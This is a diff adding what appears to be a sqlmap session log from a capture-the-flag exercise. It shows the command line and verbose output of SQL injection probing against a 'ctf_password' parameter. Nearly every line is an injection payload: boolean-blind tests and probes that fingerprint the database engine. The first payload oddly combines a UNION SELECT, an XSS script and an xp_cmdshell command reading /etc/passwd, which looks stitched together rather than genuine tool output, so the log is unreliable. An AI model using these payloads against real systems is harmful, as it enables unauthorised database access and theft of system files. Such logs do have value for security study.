@@ -1,0 +1,47 @@
+$ sqlmap -r sf_share/post.packet -v 3 -p "ctf_password" --flush-session --level 5
+
+[22:38:51] [INFO] checking if the target is protected by some kind of WAF/IPS
+[22:38:51] [PAYLOAD] 4315 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
+[22:38:51] [INFO] testing if the target URL content is stable
+[22:38:51] [INFO] target URL content is stable
+[22:38:51] [PAYLOAD] ' or '1'%3d'1".().))')(
+[22:38:52] [WARNING] heuristic (basic) test shows that POST parameter 'ctf_password' might not be injectable
+[22:38:52] [PAYLOAD] ' or '1'%3d'1'IzEoGI<'">HFvgXt
+[22:38:52] [INFO] testing for SQL injection on POST parameter 'ctf_password'
+[22:38:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[22:38:52] [PAYLOAD] ' or '1'%3d'1) AND 5999=4370-- RSXd
+[22:38:52] [DEBUG] setting match ratio for current parameter to 0.703
+[22:38:52] [PAYLOAD] ' or '1'%3d'1) AND 5988=5988-- MSsu
+[22:38:52] [PAYLOAD] ' or '1'%3d'1') AND 3566=5623-- GIGR
+[22:38:52] [DEBUG] setting match ratio for current parameter to 0.123
+[22:38:52] [PAYLOAD] ' or '1'%3d'1') AND 5988=5988-- HKDz
+[22:38:52] [PAYLOAD] ' or '1'%3d'1' AND 2032=3761-- Mrjt
+[22:38:52] [DEBUG] setting match ratio for current parameter to 0.703
+[22:38:52] [PAYLOAD] ' or '1'%3d'1' AND 5988=5988-- RxVh
+[22:38:52] [PAYLOAD] ' or '1'%3d'1' AND 6701=8283-- AYdb
+[22:38:52] [INFO] POST parameter 'ctf_password' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="the")
+[22:38:52] [PAYLOAD] ' or '1'%3d'1' AND (SELECT CVAR(NULL) FROM MSysAccessObjects) IS NULL-- gmhX
+[22:38:52] [PAYLOAD] ' or '1'%3d'1' AND (SELECT TDESENCRYPT(NULL,NULL)) IS NULL-- ynwX
+[22:38:52] [PAYLOAD] ' or '1'%3d'1' AND (SELECT %SQLUPPER NULL) IS NULL-- SSYn
+[22:38:52] [PAYLOAD] ' or '1'%3d'1' AND (SELECT MD5(NULL~NULL)) IS NULL-- QeAu
+[22:38:52] [PAYLOAD] ' or '1'%3d'1' AND (SELECT (NULL SETEQ NULL)) IS NULL-- kaYR
+[22:38:52] [PAYLOAD] ' or '1'%3d'1' AND (SELECT CHR(100)||CHR(89)||CHR(104)||CHR(114) FROM SYSIBM.SYSDUMMY1)='dYhr'-- TrLK
+[22:38:52] [PAYLOAD] ' or '1'%3d'1' AND (SELECT NULLIF(USER,SESSION_USER) FROM SYSIBM.SYSDUMMY1) IS NULL-- GJFn
+[22:38:52] [PAYLOAD] ' or '1'%3d'1' AND (SELECT NULLIFZERO(hashcode(NULL))) IS NULL-- fvcn
+[22:38:52] [PAYLOAD] ' or '1'%3d'1' AND (SELECT 'maOf' FROM RDB$DATABASE)='maOf'-- Lbue
+[22:38:52] [PAYLOAD] ' or '1'%3d'1' AND (SELECT 'qmKq' FROM INFORMATION_SCHEMA.IO_STATISTICS)='qmKq'-- dFeh
+[22:38:52] [PAYLOAD] ' or '1'%3d'1' AND (SELECT STRINGTOUTF8(NULL)) IS NULL-- XMhI
+[22:38:52] [PAYLOAD] ' or '1'%3d'1' AND (SELECT CHAR(81)||CHAR(75)||CHAR(71)||CHAR(70) FROM INFORMATION_SCHEMA.SYSTEM_USERS)='QKGF'-- uAOk
+[22:38:52] [PAYLOAD] ' or '1'%3d'1' AND (SELECT 'XhcC' FROM SYSMASTER:SYSDUAL)='XhcC'-- cOgC
+[22:38:53] [PAYLOAD] ' or '1'%3d'1' AND (SELECT ALPHA(NULL) FROM VERSIONS) IS NULL-- NMNj
+[22:38:53] [PAYLOAD] ' or '1'%3d'1' AND (SELECT TONUMBER(NULL)) IS NULL-- AwYk
+[22:38:53] [PAYLOAD] ' or '1'%3d'1' AND (SELECT ASCII_CHAR(256) FROM SYSTEM.ONEROW) IS NULL-- yRTD
+[22:38:53] [PAYLOAD] ' or '1'%3d'1' AND (SELECT CODE(NULL)) IS NULL-- Xleg
+[22:38:53] [PAYLOAD] ' or '1'%3d'1' AND (SELECT DIFFERENCE(NULL,NULL)) IS NULL-- bAME
+[22:38:53] [PAYLOAD] ' or '1'%3d'1' AND (SELECT QUARTER(NULL)) IS NULL-- yoVg
+[22:38:53] [PAYLOAD] ' or '1'%3d'1' AND (SELECT INSTR2(NULL,NULL) FROM DUAL) IS NULL-- RjJE
+[22:38:53] [PAYLOAD] ' or '1'%3d'1' AND (SELECT QUOTE_IDENT(NULL)) IS NULL-- LTXa
+[22:38:53] [PAYLOAD] ' or '1'%3d'1' AND (SELECT FROM_HEX(NULL)) IS NULL-- zePy
+[22:38:53] [PAYLOAD] ' or '1'%3d'1' AND (SELECT UNLIKELY(NULL)) IS NULL-- JmwS
+[22:38:53] [PAYLOAD] ' or '1'%3d'1' AND (SELECT 'ahZg')='JvJp'-- JiTX
+[22:38:53] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite'
